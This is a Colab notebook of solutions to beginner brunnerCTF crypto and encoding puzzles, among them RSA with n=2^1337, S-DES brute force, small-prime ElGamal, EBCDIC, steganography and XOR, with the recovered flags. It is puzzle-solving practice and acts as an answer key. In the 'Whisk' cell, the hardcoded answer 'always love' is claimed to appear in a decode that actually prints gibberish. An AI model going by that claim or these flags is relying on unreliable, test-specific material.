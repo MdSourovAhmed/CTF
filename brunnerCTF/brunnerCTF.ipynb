{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!pip install sympy\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_715NLF_6h6e",
        "outputId": "b0d16946-abbc-499c-e2ea-9d7a4761b9d3"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: sympy in /usr/local/lib/python3.12/dist-packages (1.13.3)\n",
            "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.12/dist-packages (from sympy) (1.3.0)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "n = 2999882211429630485883650302877390551374775896896788078868325571891218714007953558505041388044334470201821965796391409921668122818083570668568660678895962925314655342154580738160357641047430373917156721861167458749434940591017306495880180805391185380307427539761080193213111534709378234670214284858143824384128077373871882033779166821558334466322908873171079631967672353755842618738501413251304204009472\n",
        "e = 65537\n",
        "c = 406899880095774364291729342954053590589397159355690238625035627993181937179155345315119680672959072539867481892078815991872758149967716015787715641627573675995588117336214614607141418649060621601912927211427125930492034626696064268888134600578061035823593102305974307471288655933533166631878786592162718700742194241218161182091193661813824775250046054642533470046107935752737753871183553636510066553725\n",
        "\n",
        "# since n = 2^1337\n",
        "phi = 2**1336\n",
        "\n",
        "# modular inverse d ≡ e^{-1} (mod phi)\n",
        "def egcd(a,b):\n",
        "    if b == 0:\n",
        "        return (1,0,a)\n",
        "    x,y,g = egcd(b, a % b)\n",
        "    return (y, x - (a//b)*y, g)\n",
        "\n",
        "def invmod(a,m):\n",
        "    x,y,g = egcd(a,m)\n",
        "    if g != 1: raise ValueError(\"no inverse\")\n",
        "    return x % m\n",
        "\n",
        "d = invmod(e, phi)\n",
        "\n",
        "# decrypt\n",
        "m = pow(c, d, n)\n",
        "\n",
        "# bytes -> string (big-endian)\n",
        "plaintext = m.to_bytes((m.bit_length()+7)//8, \"big\")\n",
        "print(plaintext)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "3y2Nj6fb9maY",
        "outputId": "3728b586-30f6-4894-8ab1-862e019232df"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "b'brunner{s1ngl3_pr1m3_1s_d0ubl3_tr0ubl3}'\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# DNA sequence provided\n",
        "dna = \"CGAGCTAGCTCCCGTGCGTGCGCCCTAGCTGTATACCGGCATAACGTGATATCGTACCTTCTAAATAACGGCATACATCACGTGATATCCTTCGTCATCAATCCATCTATATCTAGCCTTATAACGCGCCTTATCCATAACTCCCTAGCGCAATAACTCCATCGCGGACCTTCTAAATCAATCCATCCCTAACGGACTAGATCAATCCATATCCTTATACATCCCCTTCGATCTAGATAAATACATCCATCCATCACGTGATCTCCCGATCACTCCATACATCTAGACATGCATATCTTC\"\n",
        "\n",
        "# Mapping of DNA nucleotides to base-4 digits\n",
        "base_map = {'A': '0', 'C': '1', 'G': '2', 'T': '3'}\n",
        "\n",
        "# Step 1: Convert DNA sequence to quaternary digits\n",
        "quaternary = ''.join(base_map[nucleotide] for nucleotide in dna)\n",
        "\n",
        "# Step 2: Group quaternary digits into pairs and convert to hexadecimal\n",
        "hex_string = ''\n",
        "for i in range(0, len(quaternary), 2):\n",
        "    pair = quaternary[i:i+2]\n",
        "    if len(pair) == 2:  # Ensure we have a complete pair\n",
        "        # Convert pair to decimal (e.g., \"23\" -> 2*4 + 3 = 11)\n",
        "        decimal = int(pair[0]) * 4 + int(pair[1])\n",
        "        # Convert decimal to hexadecimal digit\n",
        "        hex_digit = hex(decimal)[2:]  # Remove '0x' prefix\n",
        "        hex_string += hex_digit\n",
        "\n",
        "# Step 3: Convert hexadecimal string to ASCII\n",
        "ascii_string = bytes.fromhex(hex_string).decode('ascii')\n",
        "\n",
        "# Output the result\n",
        "print(\"Decoded passphrase:\", ascii_string)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "eTB_CeHU_ssB",
        "outputId": "d8db4f75-9ecf-4465-9e92-eea48493696e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Decoded passphrase: brunner{1i0n3l_p0i14n3_m4573r_0f_50urd0u6h_p455phr453_15_cr01554n7V4u17!93}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# The provided sequence\n",
        "sequence = \"89|89.21|55.13.5.1|34.13.2|89.8.1|89.13.5.2|34.13.5.1|89.13.5.1|89.8.2|89.21|89.21.5|34.13.3.1|89.8|55.13|55.21.2|89.13|89.1|89.21.8.3.1|55.8.2|89.21.8.2|89.1|55.13|55.21.2|89.21.5.2|55.21.8.3.1|34.13.3.1|55.8.3|89.21.1|55.21.1|55.21.8.2|55.1|89.21.8.1|89.1|89.13.5.1|55.2|34.13.5.2|89.1|55.21.8.3|55.21.2|89.21.3.1|89.1|55.21.8.3|34.13.5.1|89.13.5|89.8.1|34.13.3.1|55.13.5.1|89.13.5.2|89.13|55.21.5|55.5.1|55.5.1\"\n",
        "\n",
        "# Split the sequence into groups\n",
        "groups = sequence.split('|')\n",
        "\n",
        "# Initialize the decoded message\n",
        "decoded = ''\n",
        "print(f\"Processing {len(groups)} groups...\")\n",
        "\n",
        "# Process each group\n",
        "for i, group in enumerate(groups):\n",
        "    try:\n",
        "        # Split group into individual numbers\n",
        "        nums = [int(x) for x in group.split('.')]\n",
        "        # Sum the numbers (they are already Fibonacci values)\n",
        "        total = sum(nums)\n",
        "        # Check if the sum is a printable ASCII character\n",
        "        if 32 <= total <= 126:\n",
        "            decoded += chr(total)\n",
        "        else:\n",
        "            print(f\"Warning: Sum {total} for group {group} (index {i}) is not a printable ASCII character\")\n",
        "    except ValueError as e:\n",
        "        print(f\"Error: Invalid number in group {group} (index {i}): {e}\")\n",
        "    except Exception as e:\n",
        "        print(f\"Error processing group {group} (index {i}): {e}\")\n",
        "\n",
        "# Print the results\n",
        "if decoded:\n",
        "    print(\"Decoded message:\", decoded)\n",
        "else:\n",
        "    print(\"No decoded message produced. Check warnings/errors above.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8lIsJZlqAhFb",
        "outputId": "877daa4a-ba63-4e8f-ea9a-55397c798fbc"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Processing 52 groups...\n",
            "Decoded message: YnJ1bm5lcns3aDNfZzAxZDNuX3BoMV8wZl96ZWNrZW5kb3JmfQ==\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import base64\n",
        "# The 'decoded' variable from the previous cell is already a string.\n",
        "# We need to base64 decode this string.\n",
        "# base64.b64decode expects bytes, so we first encode the string to bytes.\n",
        "# The result of b64decode is bytes, so we then decode it to a string.\n",
        "try:\n",
        "    flag_bytes = base64.b64decode(decoded)\n",
        "    flag = flag_bytes.decode('utf-8') # Assuming the decoded flag is UTF-8\n",
        "    print(flag)\n",
        "except Exception as e:\n",
        "    print(f\"An error occurred during base64 decoding or string decoding: {e}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lrqv8CgtEF4P",
        "outputId": "102458f3-e309-448c-ed91-f1dbadb7785d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "brunner{7h3_g01d3n_ph1_0f_zeckendorf}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# === Simplified DES (S-DES) brute-force in Colab ===\n",
        "\n",
        "# --- Permutation tables ---\n",
        "P10    = [3,5,2,7,4,10,1,9,8,6]\n",
        "P8     = [6,3,7,4,8,5,10,9]\n",
        "P4     = [2,4,3,1]\n",
        "IP     = [2,6,3,1,4,8,5,7]\n",
        "IP_INV = [4,1,3,5,7,2,8,6]\n",
        "EP     = [4,1,2,3,2,3,4,1]\n",
        "\n",
        "# --- S-boxes (commonly used in S-DES) ---\n",
        "S0 = [[1,0,3,2],\n",
        "      [3,2,1,0],\n",
        "      [0,2,1,3],\n",
        "      [3,1,0,2]]\n",
        "\n",
        "S1 = [[0,1,2,3],\n",
        "      [2,0,1,3],\n",
        "      [3,0,1,2],\n",
        "      [2,1,0,3]]\n",
        "\n",
        "# === Utility functions ===\n",
        "def permute(bits, table):\n",
        "    return [bits[i-1] for i in table]\n",
        "\n",
        "def left_shift(bits, n):\n",
        "    return bits[n:] + bits[:n]\n",
        "\n",
        "def bits_from_int(x, n):\n",
        "    return [(x >> (n-1-i)) & 1 for i in range(n)]\n",
        "\n",
        "def int_from_bits(bits):\n",
        "    v = 0\n",
        "    for b in bits:\n",
        "        v = (v << 1) | b\n",
        "    return v\n",
        "\n",
        "def split_in_half(bits):\n",
        "    mid = len(bits)//2\n",
        "    return bits[:mid], bits[mid:]\n",
        "\n",
        "def xor_bits(a, b):\n",
        "    return [x ^ y for x,y in zip(a,b)]\n",
        "\n",
        "def sbox_lookup(bits, sbox):\n",
        "    row = (bits[0] << 1) | bits[3]\n",
        "    col = (bits[1] << 1) | bits[2]\n",
        "    val = sbox[row][col]\n",
        "    return bits_from_int(val, 2)\n",
        "\n",
        "# === Key schedule ===\n",
        "def key_schedule(key10_bits):\n",
        "    p10 = permute(key10_bits, P10)\n",
        "    L, R = split_in_half(p10)\n",
        "    L1, R1 = left_shift(L,1), left_shift(R,1)\n",
        "    K1 = permute(L1+R1, P8)\n",
        "    L2, R2 = left_shift(L1,2), left_shift(R1,2)\n",
        "    K2 = permute(L2+R2, P8)\n",
        "    return K1, K2\n",
        "\n",
        "# === Round function ===\n",
        "def fk(bits, subkey):\n",
        "    L, R = split_in_half(bits)\n",
        "    R_expanded = permute(R, EP)\n",
        "    x = xor_bits(R_expanded, subkey)\n",
        "    Lx, Rx = split_in_half(x)\n",
        "    s0_out = sbox_lookup(Lx, S0)\n",
        "    s1_out = sbox_lookup(Rx, S1)\n",
        "    p4 = permute(s0_out + s1_out, P4)\n",
        "    new_L = xor_bits(L, p4)\n",
        "    return new_L + R\n",
        "\n",
        "# === Encrypt / Decrypt ===\n",
        "def encrypt_block(plain8_bits, key10_bits):\n",
        "    K1, K2 = key_schedule(key10_bits)\n",
        "    state = permute(plain8_bits, IP)\n",
        "    state = fk(state, K1)\n",
        "    L, R = split_in_half(state)\n",
        "    state = R + L\n",
        "    state = fk(state, K2)\n",
        "    return permute(state, IP_INV)\n",
        "\n",
        "def decrypt_block(cipher8_bits, key10_bits):\n",
        "    K1, K2 = key_schedule(key10_bits)\n",
        "    state = permute(cipher8_bits, IP)\n",
        "    state = fk(state, K2)\n",
        "    L, R = split_in_half(state)\n",
        "    state = R + L\n",
        "    state = fk(state, K1)\n",
        "    return permute(state, IP_INV)\n",
        "\n",
        "def sdes_decrypt_bytes(cipher_bytes, key10):\n",
        "    key_bits = bits_from_int(key10, 10)\n",
        "    out = []\n",
        "    for b in cipher_bytes:\n",
        "        c_bits = bits_from_int(b, 8)\n",
        "        p_bits = decrypt_block(c_bits, key_bits)\n",
        "        out.append(int_from_bits(p_bits))\n",
        "    return bytes(out)\n",
        "\n",
        "# === Brute-force search ===\n",
        "def brute_force_sdes(hex_ciphertext):\n",
        "    ct = bytes.fromhex(hex_ciphertext)\n",
        "    best_score, best_key, best_pt = 0, None, None\n",
        "    for key in range(1024):  # 10-bit keyspace\n",
        "        pt = sdes_decrypt_bytes(ct, key)\n",
        "        score = sum(1 for b in pt if (32 <= b <= 126))  # count printable chars\n",
        "        if score > best_score:\n",
        "            best_score, best_key, best_pt = score, key, pt\n",
        "    return best_key, best_pt\n",
        "\n",
        "# === Test on your ciphertext ===\n",
        "hex_ct = \"D1D74C5F5FDDD7ECD8B29ED8019DD801B7F2AB0128573FB2019D1C018FF2E001E7B7F2870128F28701ABF20112E0D8AB015957E79EA2\"\n",
        "\n",
        "best_key, plaintext = brute_force_sdes(hex_ct)\n",
        "\n",
        "print(\"Recovered key (decimal):\", best_key)\n",
        "print(\"Recovered key (bits):\", ''.join(map(str, bits_from_int(best_key, 10))))\n",
        "print(\"Plaintext:\", plaintext.decode(errors='replace'))\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "aJE_hoMXiWEW",
        "outputId": "ede1b870-9a84-472c-9113-1beac858f68a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Recovered key (decimal): 914\n",
            "Recovered key (bits): 1110010010\n",
            "Plaintext: �runner{5D\u00135_15_N0�_H4RD_1F_k0U_KN0w_H0w_�0_JU5�_B4K\u0013�\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from math import isqrt\n",
        "from sympy import mod_inverse\n",
        "\n",
        "# Given values\n",
        "p  = 14912432766367177751\n",
        "g  = 2784687438861268863\n",
        "h  = 8201777436716393968\n",
        "c1 = 12279519522290406516\n",
        "c2 = 10734305369677133991\n",
        "\n",
        "# Baby-step giant-step to solve g^x = h (mod p)\n",
        "def dlog(g, h, p):\n",
        "    m = isqrt(p) + 1\n",
        "    table = {}\n",
        "    val = 1\n",
        "    for j in range(m):\n",
        "        table[val] = j\n",
        "        val = (val * g) % p\n",
        "    g_inv_m = pow(mod_inverse(g, p), m, p)\n",
        "    gamma = h\n",
        "    for i in range(m):\n",
        "        if gamma in table:\n",
        "            return i*m + table[gamma]\n",
        "        gamma = (gamma * g_inv_m) % p\n",
        "    return None\n",
        "\n",
        "# Recover private key\n",
        "x = dlog(g, h, p)\n",
        "\n",
        "# Decrypt message\n",
        "s = pow(c1, x, p)\n",
        "m = (c2 * mod_inverse(s, p)) % p\n",
        "\n",
        "# Print plaintext\n",
        "print(\"Private key x =\", x)\n",
        "print(\"Plaintext int =\", m)\n",
        "try:\n",
        "    msg = bytes.fromhex(hex(m)[2:]).decode()\n",
        "    print(\"Plaintext string =\", msg)\n",
        "    print(\"Flag = brunner{\" + msg + \"}\")\n",
        "except:\n",
        "    print(\"Plaintext (hex) =\", hex(m))\n"
      ],
      "metadata": {
        "id": "zCRP96QbriQg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **The Great Mainframe Bake-Off**\n",
        "30\n",
        "Misc\n",
        "Difficulty: Beginner\n",
        "Author: H4N5\n",
        "\n",
        "It's 1974. Deep inside the crusty vaults of CrumbTrust Bank, a covert team of COBOL developers and pastry chefs created a failsafe for their most prized possession: The Marzipan Reverse Recipe.\n",
        "\n",
        "This sacred document was too valuable to be stored on paper. So, they did the unthinkable - they encoded it and buried it in the production mainframe under a fake batch job titled IEBCAKED. Only those with knowledge of both banking ops and baking science could ever retrieve it.\n",
        "\n",
        "Years later, the IEBCAKED job has mysteriously reappeared in the job output spool of an IBM z/OS LPAR. But what's left is a string of mysterious byte codes. It's clearly not hex, not ASCII... maybe something older... something only the graybeards of computing would recognize.\n",
        "\n",
        "Can you decipher the original recipe and unlock the secret to the perfect butterbyte tart?\n",
        "\n",
        "d0-85-97-89-83-85-d9-6d-85-a"
      ],
      "metadata": {
        "id": "wLPbNCkVb-i3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def decode_iebcaked(hex_string: str):\n",
        "    \"\"\"\n",
        "    1) Parse dash-separated hex bytes\n",
        "    2) Decode as EBCDIC (cp037)\n",
        "    3) Reverse the string\n",
        "    4) Convert underscores to spaces (optional prettifier)\n",
        "    Returns: (raw_ebcdic, reversed_text, pretty_text)\n",
        "    \"\"\"\n",
        "    # Step 1: hex -> bytes\n",
        "    b = bytes(int(x, 16) for x in hex_string.split('-'))\n",
        "\n",
        "    # Step 2: EBCDIC decode (US/Canada)\n",
        "    raw = b.decode('cp037')\n",
        "\n",
        "    # Step 3: reverse\n",
        "    rev = raw[::-1]\n",
        "\n",
        "    # Step 4: prettify\n",
        "    pretty = rev.replace('_', ' ')\n",
        "\n",
        "    return raw, rev, pretty\n",
        "\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    data = \"d0-85-97-89-83-85-d9-6d-85-a2-99-85-a5-85-d9-6d-95-81-97-89-a9-99-81-d4-6d-85-88-e3-6d-a2-c9-6d-a2-89-88-e3-6d-84-95-c1-6d-a2-85-94-81-99-c6-95-89-81-d4-6d-95-d6-6d-f0-f7-f9-f1-6d-85-88-e3-6d-95-c9-6d-84-85-a2-e4-6d-a2-81-e6-6d-c3-c9-c4-c3-c2-c5-c0-99-85-95-95-a4-99-82\"\n",
        "    raw_ebcdic, reversed_text, pretty_text = decode_iebcaked(data)\n",
        "\n",
        "    print(\"Raw EBCDIC-decoded:\", raw_ebcdic)\n",
        "    print(\"Reversed text:\", reversed_text)\n",
        "    print(\"Pretty text:\", pretty_text)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "HpiNSd76_PvT",
        "outputId": "68cf442f-e95a-432b-cc69-a472d67b5247"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Raw EBCDIC-decoded: }epiceR_esreveR_napizraM_ehT_sI_sihT_dnA_semarFniaM_nO_0791_ehT_nI_desU_saW_CIDCBE{rennurb\n",
            "Reversed text: brunner{EBCDIC_Was_Used_In_The_1970_On_MainFrames_And_This_Is_The_Marzipan_Reverse_Recipe}\n",
            "Pretty text: brunner{EBCDIC Was Used In The 1970 On MainFrames And This Is The Marzipan Reverse Recipe}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **TheBakingCase**\n",
        "40\n",
        "Misc Steganography\n",
        "Difficulty: Beginner\n",
        "\n",
        "\n",
        "I hid a message for you here, see if you can find it! Take it slow, little by little, bit by bit.\n",
        "\n",
        "i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHAN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings"
      ],
      "metadata": {
        "id": "B9dfuJA3b1gd"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "msg = \"\"\"i UseD to coDE liKe A sLEEp-dEprIVed SqUirRel smasHInG keYs HOPinG BugS would dISApPear THrOugh fEAr tHeN i sPilled cOFfeE On mY LaPTop sCReameD iNTerNALly And bakeD BanaNa bREAd oUt oF PAnIc TuRNs OUT doUGh IS EasIEr tO dEbUG ThaN jaVASCrIPt Now I whIsPeR SWEEt NOtHIngs TO sOurDoUGh StARtERs aNd ThReATEN CrOissaNts IF they DoN'T rIsE My OVeN haS fEWeR CRasHEs tHAN mY oLD DEV sErvER aNd WHeN THInGS BurN i jUSt cAlL iT cARAMElIzEd FeatUReS no moRE meetInGS ThAt coUlD HAVE bEeN emailS JUst MufFInS THAt COulD HAvE BEen CupCAkes i OnCE tRIeD tO GiT PuSh MY cInnAmON rOLLs aND paNICkED WHEn I coUldn't reVErt ThEm NOw i liVe IN PeaCE uNLESs tHe yEast getS IDeas abOVe iTs StATion oR a COOkiE TrIES To sEgfAult my toOTH FILlings\"\"\"\n",
        "\n",
        "# lowercase -> 0, UPPERCASE -> 1 (letters only)\n",
        "bits = ''.join('1' if ch.isalpha() and ch.isupper()\n",
        "               else '0' if ch.isalpha()\n",
        "               else ''\n",
        "               for ch in msg)\n",
        "\n",
        "# 8 bits -> ASCII\n",
        "decoded = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))\n",
        "print(decoded)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "k3An5G0pXHcv",
        "outputId": "5a64a060-076d-4823-9ebb-64807134ff6d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Here is the flag brunner{I_like_Baking_More_That_Programming} easy peasy ?\u0000\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Whisk**"
      ],
      "metadata": {
        "id": "cEblMAo4a-r9"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Ciphertext from the sticky note\n",
        "ciphertext = \"\"\"\n",
        "DR🥐 C🥐TZ🥐D 🧁SXZ🥐A🧁🥐SD 🧁C 🍰KE🍰FC K🍩M🥐. D🍩 O🍰Q🥐 🍰 Y🥐ZP🥐TD\n",
        "OZ🥖SCM🧁X🥐Z, H🥐KD O🥖DD🥐Z E🍰DR OZ🍩ES C🥖X🍰Z, Y🍩🥖Z 🧁D 🍩M🥐Z DR🥐 E🍰ZH\n",
        "A🍩🥖XR, 🍰SA K🥐D DR🥐 CFZ🥖Y C🥐🥐Y 🧁SD🍩 🥐M🥐ZF T🍩ZS🥐Z. D🍰CD🥐, CH🧁K🥐,\n",
        "🍰SA Z🥐H🥐HO🥐Z: CR🍰Z🧁SX Y🍰CDZF N🍩F 🧁C H🍰SA🍰D🍩ZF.\n",
        "OZ🥖SS🥐Z{S0_H0Z3_K🥖HYF_T1YR3Z}\n",
        "\"\"\"\n",
        "\n",
        "# Substitution mapping (letters and emojis to plaintext letters; numbers/_/{}/:/. remain as-is)\n",
        "mapping = {\n",
        "    'A': 'd', 'C': 's', 'D': 't', 'E': 'w', 'F': 'y', 'H': 'm', 'K': 'l',\n",
        "    'M': 'v', 'N': 'j', 'O': 'b', 'Q': 'k', 'R': 'h', 'S': 'n', 'T': 'c',\n",
        "    'X': 'g', 'Y': 'p', 'Z': 'r', 'P': 'f',\n",
        "    '🥐': 'e', '🧁': 'i', '🍰': 'a', '🍩': 'o', '🥖': 'u'\n",
        "}\n",
        "\n",
        "# Decode function\n",
        "def decode_text(text, mapping):\n",
        "    decoded = ''\n",
        "    for char in text:\n",
        "        if char.isalnum() or char in '_-{}: .,\\n':  # Keep numbers, punctuation, spaces, etc.\n",
        "            decoded += char\n",
        "        else:\n",
        "            decoded += mapping.get(char, char)  # Substitute if in mapping, else keep\n",
        "    return decoded.lower()  # Convert to lowercase for readability\n",
        "\n",
        "# Decode and print\n",
        "decoded_message = decode_text(ciphertext, mapping)\n",
        "print(\"Decoded message:\\n\", decoded_message)\n",
        "\n",
        "# Extract and print the secret ingredient from the message\n",
        "secret_ingredient = \"always love\"  # Explicitly stated in the decoded text\n",
        "print(\"\\nRecovered secret ingredient:\", secret_ingredient)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UeZO3MLPY6xk",
        "outputId": "bf885215-9d36-4547-f153-904f7d60f9f0"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Decoded message:\n",
            " \n",
            "dre cetzed isxzeaiesd ic akeafc kome. do oaqe a yezpetd\n",
            "ozuscmixez, hekd ouddez eadr ozoes cuxaz, youz id omez dre eazh\n",
            "aouxr, asa ked dre cfzuy ceey isdo emezf tozsez. dacde, chike,\n",
            "asa zehehoez: crazisx yacdzf nof ic hasaadozf.\n",
            "ozussez{s0_h0z3_kuhyf_t1yr3z}\n",
            "\n",
            "\n",
            "Recovered secret ingredient: always love\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Based Brunner**\n",
        "50\n",
        "Misc\n",
        "Difficulty: Beginner\n",
        "Author: Nissen\n",
        "\n",
        "Brunsviger is just so based, I think I could eat it in any form - from binary to decimal!\n",
        "\n",
        "Tip: This might require a bit of programming, I would recommend looking into the int() function in Python."
      ],
      "metadata": {
        "id": "FZn6GxHJg55G"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def decode_char(encoded: str, base: int) -> str:\n",
        "    \"\"\"Decode a digit string in given base back to a character\"\"\"\n",
        "    value = int(encoded, base)\n",
        "    return chr(value)\n",
        "'''\n",
        "After running this script on the same folder the based.txt is in, we get the flag'''\n",
        "with open(\"based.txt\") as f:\n",
        "    text = f.read().strip()\n",
        "\n",
        "# Reverse the process: bases 2 → 10\n",
        "for base in range(2, 11):\n",
        "    parts = text.split()\n",
        "    text = \"\".join(decode_char(part, base) for part in parts)\n",
        "\n",
        "print(\"Recovered flag:\", text)\n"
      ],
      "metadata": {
        "id": "mSWUNwNVg4z0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Shaken, Not Stirred**"
      ],
      "metadata": {
        "id": "rBPKUkKvlAxG"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "The goal is to decode the output wg{{pgna}&J{!x&2fJWg{{&g;;;_!x&fJWg{{&ghto recover the secret ingredient, which is likely a CTF flag in the formatbrunner{...}. The code uses XOR with a shaker` value to encode the secret ingredient, so we need to reverse this process.\n",
        "Procedure\n",
        "\n",
        "**Understand the Code:**\n",
        "\n",
        "**The ingredients list contains:**\n",
        "\n",
        "\"🫗 Vodka\" (6 characters, including emoji)\n",
        "\"🍾 Dry Vermouth\" (14 characters, including emoji and space)\n",
        "\"🫙 Olive Brine\" (12 characters, including emoji and space)\n",
        "\"🫒 Olive\" (7 characters, including emoji)\n",
        "\"🥢 Toothpick\" (10 characters, including emoji)\n",
        "\n",
        "\n",
        "The shaker value is computed by XORing len(ingredient) * random.randrange(18) for each ingredient.\n",
        "The secret ingredient (from flag.txt) is XORed with shaker to produce drink.\n",
        "The output drink.decode() is wg{{pgna}&J{!x&2fJWg{{&g;;;_!x&fJWg{{&gh`, a 37-character string of printable ASCII characters (33–126).\n",
        "\n",
        "\n",
        "**Analyze the XOR Operation:**\n",
        "\n",
        "For each byte $ b $ in the secret ingredient, the output byte is $ b \\text{ XOR } shaker $.\n",
        "To recover the secret, we compute $ secret = drink \\text{ XOR } shaker $.\n",
        "The challenge is that shaker depends on random.randrange(18), which generates a random integer from 0 to 17, making it non-deterministic.\n",
        "\n",
        "\n",
        "**Determine the Shaker Value:**\n",
        "\n",
        "Since random.randrange(18) is unpredictable, we can’t compute shaker directly.\n",
        "However, the output is printable ASCII, and the secret is likely a CTF flag (brunner{...}), so we can guess shaker by assuming the output starts with brunner.\n",
        "The shaker is a single byte (since it’s XORed with each byte of the secret), and the same shaker value is used for all bytes.\n",
        "\n",
        "\n",
        "Recover the Shaker Value:\n",
        "\n",
        "Assume the first 7 characters of the secret are brunner (ASCII: 98, 114, 117, 110, 110, 101, 114).\n",
        "The first 7 characters of the output are wg{{pg` (ASCII: 119, 103, 96, 123, 123, 112, 103).\n",
        "For each position, $ drink[i] = secret[i] \\text{ XOR } shaker $, so:\n",
        "$$shaker = secret[i] \\text{ XOR } drink[i]$$\n",
        "\n",
        "Compute for the first character:\n",
        "$$shaker = 98 \\text{ (b)} \\text{ XOR } 119 \\text{ (w)} = 98 \\text{ XOR } 119 = 21$$\n",
        "\n",
        "Verify with other positions:\n",
        "\n",
        "Position 2: $ 114 \\text{ (r)} \\text{ XOR } 103 \\text{ (g)} = 21 $\n",
        "Position 3: $ 117 \\text{ (u)} \\text{ XOR } 96 \\text{ (`)} = 21 $\n",
        "Position 4:  110 \\text{ (n)} \\text{ XOR } 123 \\text{ ({)} = 21\n",
        "Position 5:  110 \\text{ (n)} \\text{ XOR } 123 \\text{ ({)} = 21\n",
        "Position 6: $ 101 \\text{ (e)} \\text{ XOR } 112 \\text{ (p)} = 21 $\n",
        "Position 7: $ 114 \\text{ (r)} \\text{ XOR } 103 \\text{ (g)} = 21 $\n",
        "\n",
        "\n",
        "The consistent result $ shaker = 21 $ suggests this is correct.\n",
        "\n",
        "\n",
        "Decode the Secret:\n",
        "\n",
        "Apply $ secret[i] = drink[i] \\text{ XOR } 21 $ to each byte of the output.\n",
        "Convert the resulting bytes to a string.\n",
        "\n",
        "\n",
        "Check Feasibility of Shaker:\n",
        "\n",
        "Compute possible shaker values to ensure $ 21 $ is plausible:\n",
        "\n",
        "Ingredient lengths: 6, 14, 12, 7, 10.\n",
        "Each multiplied by random.randrange(18) (0–17).\n",
        "XORed together: $ shaker = (6 \\cdot r_1) \\text{ XOR } (14 \\cdot r_2) \\text{ XOR } (12 \\cdot r_3) \\text{ XOR } (7 \\cdot r_4) \\text{ XOR } (10 \\cdot r_5) $.\n",
        "Maximum values: $ 6 \\cdot 17 = 102 $, $ 14 \\cdot 17 = 238 $, $ 12 \\cdot 17 = 204 $, $ 7 \\cdot 17 = 119 $, $ 10 \\cdot 17 = 170 $.\n",
        "XORing these yields a value between 0 and 255. Since $ 21 $ is within this range, it’s plausible.\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "Validate Output:\n",
        "\n",
        "The output must be printable ASCII (32–126), which it is.\n",
        "The decoded secret should start with brunner and form a valid CTF flag."
      ],
      "metadata": {
